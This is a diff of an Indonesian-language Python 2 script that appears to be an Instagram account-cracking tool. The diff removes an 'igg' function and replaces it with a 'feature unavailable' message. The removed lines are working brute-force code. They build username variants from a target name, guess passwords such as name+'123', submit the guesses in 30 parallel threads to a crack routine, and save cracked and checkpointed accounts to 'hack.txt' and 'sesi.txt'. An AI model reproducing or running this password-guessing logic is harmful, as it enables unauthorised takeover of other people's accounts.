@@ -337,61 +337,9 @@ def cekhasil():
 
 ####IGEH####
 def igg():
-	print ("\n%s [%s!%s] Contoh %s: %sRahma "%(P,M,P,M,O))
-	usr_ = raw_input('%s [?] Input > %s'%(P,O))
-	jumlah = input('%s [?] Limit > %s'%(P,O))
-	bff_2 = usr_.replace(" ", "")
-	cr.append("ramdhan_ramadhian")
-	mi.append(bff_2+"|"+bff_2)
-	mi.append(bff_2+"_"+"|"+bff_2)
-	for _i_ in range(1, jumlah+1):
-		mi.append(bff_2+str(_i_)+"|"+bff_2)
-		mi.append(bff_2+"_"+str(_i_)+"|"+bff_2)
-		mi.append(bff_2+str(_i_)+"_"+"|"+bff_2)
-	print '\n%s [%s*%s] akun %sOK%s tersimpan di >%s hack.txt'%(P,K,P,H,P,H);jeda(0.2)
-	print '%s [%s*%s] akun %sCP %stersimpan di > %s sesi.txt\n'%(P,K,P,K,P,K);jeda(0.2)
-	with ThreadPoolExecutor(max_workers=30) as log:
-		for ro in mi:
-			try:
-				_bff_ = []
-				_r_ = ro.encode("utf-8")
-				_o_ = _r_.split("|")[0]
-				_m_ = _r_.split("|")[1]
-				_i_ = _m_.split()
-				if len(cr) != 1:
-					if len(_o_) >= 6:
-						_bff_.append(_o_)
-						if len(_i_[0]) <= 2:
-							if len(_i_) >= 2:
-								_bff_.append(_i_[0]+_i_[1])
-							if len(_m_) >= 6:
-								_bff_.append(_m_)
-						else:
-							_bff_.append(_i_[0]+"123")
-							if len(_i_) >= 2:
-								_bff_.append(_i_[0]+_i_[1])
-							if len(_m_) >= 6:
-								_bff_.append(_m_)
-					else:
-						_bff_.append(_o_+_o_)
-						if len(_i_[0]) <= 2:
-							if len(_i_) >= 2:
-								_bff_.append(_i_[0]+_i_[1])
-							if len(_m_) >= 6:
-								_bff_.append(_m_)
-						else:
-							if len(_i_) >= 2:
-								_bff_.append(_i_[0]+_i_[1])
-							_bff_.append(_i_[0]+"123")
-							if len(_m_) >= 6:
-								_bff_.append(_m_)
-				else:
-					_bff_.append(_i_[0]+"123")
-					_bff_.append(_i_[0]+"12345")
-					_bff_.append(_o_)
-				log.submit(crack2, _o_, _bff_)
-			except: pass
-	exit("%s• finished"%(H))
+    jalan(' [*] maaf fitur ini tidak tersedia sekarang\n [*] silahkan tunggu update terbaru')
+    raw_input('\n [*] kembali ')
+    menu()
 
 ####INFO TOOLS####
 def info_tools():
